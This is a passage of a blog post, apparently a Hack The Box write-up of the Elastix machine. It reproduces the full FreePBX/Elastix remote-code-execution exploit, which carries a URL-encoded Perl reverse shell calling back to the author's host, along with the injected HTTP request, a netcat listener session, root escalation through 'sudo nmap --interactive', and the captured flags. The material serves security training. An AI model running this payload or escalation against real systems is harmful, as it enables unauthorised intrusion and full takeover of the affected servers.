+</span></span><span style="display:flex;"><span>Elastix 2.x - Blind SQL Injection                                                                                                                                                                      | php/webapps/36305.txt
+</span></span><span style="display:flex;"><span>Elastix &lt; 2.5 - PHP Code Injection                                                                                                                                                                     | php/webapps/38091.php
+</span></span><span style="display:flex;"><span>FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                                                 | php/webapps/18650.py
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit -m 18650.py
+</span></span><span style="display:flex;"><span>  Exploit: Elastix 2.2.0 - Remote Code Execution
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/37637
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/php/webapps/18650.py
+</span></span><span style="display:flex;"><span>    Codes: N/A
+</span></span><span style="display:flex;"><span> Verified: True
+</span></span><span style="display:flex;"><span>File Type: ASCII text
+</span></span><span style="display:flex;"><span>Copied to: /home/kali/18650.py
+</span></span></code></pre></div><p>I edit the code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nano 18650.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat 18650.py   
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">############################################################</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Google Dork: oy vey</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Date: March 23rd, 2012</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Author: muts, SSL update by Emporeo</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tested on: multiple</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CVE : notyet</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">############################################################</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Discovered by Martin Tschirsich</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># http://seclists.org/fulldisclosure/2012/Mar/234</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># http://www.exploit-db.com/exploits/18649</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">############################################################</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ssl
+</span></span><span style="display:flex;"><span>rhost<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.10.10.7&#34;</span>
+</span></span><span style="display:flex;"><span>lhost<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.10.14.104&#34;</span>
+</span></span><span style="display:flex;"><span>lport<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>extension<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;233&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ssl<span style="color:#f92672">.</span>_create_default_https_context <span style="color:#f92672">=</span> ssl<span style="color:#f92672">.</span>_create_unverified_context
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reverse shell payload</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://&#39;</span><span style="color:#f92672">+</span>str(rhost)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/recordings/misc/callme_page.php?action=c&amp;callmenum=&#39;</span><span style="color:#f92672">+</span>str(extension)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;@from-internal/n%0D%0AApplication:</span><span style="color:#e6db74">%20s</span><span style="color:#e6db74">ystem%0D%0AData:%20perl%20-MIO%20-e</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">27%24p</span><span style="color:#e6db74">%3d</span><span style="color:#e6db74">fork%3bexit</span><span style="color:#e6db74">%2c</span><span style="color:#e6db74">if</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">24p</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">3b</span><span style="color:#e6db74">%24c%3d</span><span style="color:#e6db74">new%20IO</span><span style="color:#e6db74">%3a%3a</span><span style="color:#e6db74">Socket</span><span style="color:#e6db74">%3a%3a</span><span style="color:#e6db74">INET%28PeerAddr</span><span style="color:#e6db74">%2c</span><span style="color:#e6db74">%22&#39;</span><span style="color:#f92672">+</span>str(lhost)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%3a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>str(lport)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%22%</span><span style="color:#e6db74">29%3bSTDIN-</span><span style="color:#e6db74">%3e</span><span style="color:#e6db74">fdopen</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">24c</span><span style="color:#e6db74">%2c</span><span style="color:#e6db74">r</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">3b</span><span style="color:#e6db74">%24%</span><span style="color:#e6db74">7e-</span><span style="color:#e6db74">%3e</span><span style="color:#e6db74">fdopen</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">24c</span><span style="color:#e6db74">%2c</span><span style="color:#e6db74">w</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">3bsystem</span><span style="color:#e6db74">%24%</span><span style="color:#e6db74">5f%20while</span><span style="color:#e6db74">%3c%3e</span><span style="color:#e6db74">%3b</span><span style="color:#e6db74">%27%</span><span style="color:#e6db74">0D%0A%0D%0A&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>urllib<span style="color:#f92672">.</span>urlopen(url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># On Elastix, once we have a shell, we can escalate to root:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># root@bt:~# nc -lvp 443</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># listening on [any] 443 ...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># connect to [172.16.254.223] from voip [172.16.254.72] 43415</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># uid=100(asterisk) gid=101(asterisk)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sudo nmap --interactive</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># nmap&gt; !sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span>
+</span></span></code></pre></div><p>I have a bit of problem with <code>urllib</code> library, thereby I make another file, copy and edit the exploit and add  the <code>print()</code> function :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ touch rce.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nano rce.py  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat rce.py
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>rhost<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.10.10.7&#34;</span>
+</span></span><span style="display:flex;"><span>lhost<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.10.14.104&#34;</span>
+</span></span><span style="display:flex;"><span>lport<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>extension<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1000&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reverse shell payload</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://&#39;</span><span style="color:#f92672">+</span>str(rhost)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/recordings/misc/callme_page.php?action=c&amp;callmenum=&#39;</span><span style="color:#f92672">+</span>str(extension)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;@from-internal/n%0D%0AApplication:</span><span style="color:#e6db74">%20s</span><span style="color:#e6db74">ystem%0D%0AData:%20perl%20-MIO%20-e</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">27%24p</span><span style="color:#e6db74">%3d</span><span style="color:#e6db74">fork%3bexit</span><span style="color:#e6db74">%2c</span><span style="color:#e6db74">if</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">24p</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">3b</span><span style="color:#e6db74">%24c%3d</span><span style="color:#e6db74">new%20IO</span><span style="color:#e6db74">%3a%3a</span><span style="color:#e6db74">Socket</span><span style="color:#e6db74">%3a%3a</span><span style="color:#e6db74">INET%28PeerAddr</span><span style="color:#e6db74">%2c</span><span style="color:#e6db74">%22&#39;</span><span style="color:#f92672">+</span>str(lhost)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%3a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>str(lport)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%22%</span><span style="color:#e6db74">29%3bSTDIN-</span><span style="color:#e6db74">%3e</span><span style="color:#e6db74">fdopen</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">24c</span><span style="color:#e6db74">%2c</span><span style="color:#e6db74">r</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">3b</span><span style="color:#e6db74">%24%</span><span style="color:#e6db74">7e-</span><span style="color:#e6db74">%3e</span><span style="color:#e6db74">fdopen</span><span style="color:#e6db74">%28%</span><span style="color:#e6db74">24c</span><span style="color:#e6db74">%2c</span><span style="color:#e6db74">w</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">3bsystem</span><span style="color:#e6db74">%24%</span><span style="color:#e6db74">5f%20while</span><span style="color:#e6db74">%3c%3e</span><span style="color:#e6db74">%3b</span><span style="color:#e6db74">%27%</span><span style="color:#e6db74">0D%0A%0D%0A&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(url)
+</span></span></code></pre></div><pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ python3 rce.py
+https://10.10.10.7/recordings/misc/callme_page.php?action=c&amp;callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.104%3a1234%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
+</code></pre><p>I open a Listening port:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>I <code>Intercept</code> the <code>Request</code> after the login and I <code>inject</code> this payload:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">GET /recordings/misc/callme_page.php?action=c&amp;callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.104%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length: 693
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host: 10.10.10.7
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Cookie: testing=1; elastixSession=gnq99bf8gq7i599b799qorvo63; ARI=qef8kk0l2fibqkcii8j60ealr4
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Cache-Control: max-age=0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Ch-Ua: 
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Ch-Ua-Mobile: ?0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Ch-Ua-Platform: &#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Upgrade-Insecure-Requests: 1
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Fetch-Site: none
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Fetch-Mode: navigate
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Fetch-User: ?1
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Fetch-Dest: document
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept-Encoding: gzip, deflate
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept-Language: en-US,en;q=0.9
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Connection: close
+</span></span></span></code></pre></div><ul>
+<li>Reverse Shell:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.104<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.7<span style="color:#f92672">]</span> <span style="color:#ae81ff">49992</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>asterisk
+</span></span><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>bash-3.2$ 
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I execute the instructions inside the exploit (<code>Remote Code Execution</code>) and I open a interactive session with nmap and I spawn a shell like root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>bash-3.2$ sudo nmap --interactive
+</span></span><span style="display:flex;"><span>sudo nmap --interactive
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap V. 4.11 <span style="color:#f92672">(</span> http://www.insecure.org/nmap/ <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#66d9ef">for</span> help
+</span></span><span style="display:flex;"><span>nmap&gt; !sh
+</span></span><span style="display:flex;"><span>!sh
+</span></span><span style="display:flex;"><span>sh-3.2# whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>I take the <code>user flag</code>:</p>
+<pre tabindex="0"><code>sh-3.2# cd /home
+cd /home
+sh-3.2# ls -all
+ls -all
+total 28
+drwxr-xr-x  4 root       root       4096 Apr  7  2017 .
+drwxr-xr-x 22 root       root       4096 Jul 19 09:36 ..
+drwxrwxr-x  2 fanis      fanis      4096 Apr  7  2017 fanis
+drwx------  2 spamfilter spamfilter 4096 Apr  7  2017 spamfilter
+sh-3.2# cd fanis 
+cd fanis 
+sh-3.2# ls              
+ls
+user.txt
+sh-3.2# cat user.txt
+cat user.txt
+715e20a1890d017f763281c69e3d8fc6
+</code></pre><p>I take the <code>root flag</code>:</p>
+<pre tabindex="0"><code>sh-3.2# cat /root/root.txt
+cat /root/root.txt
+e45300f485ff19296c577f009e61684f
+sh-3.2# 
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/academy/">
+                <span class="button__text">HTB Writeup - Academy (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
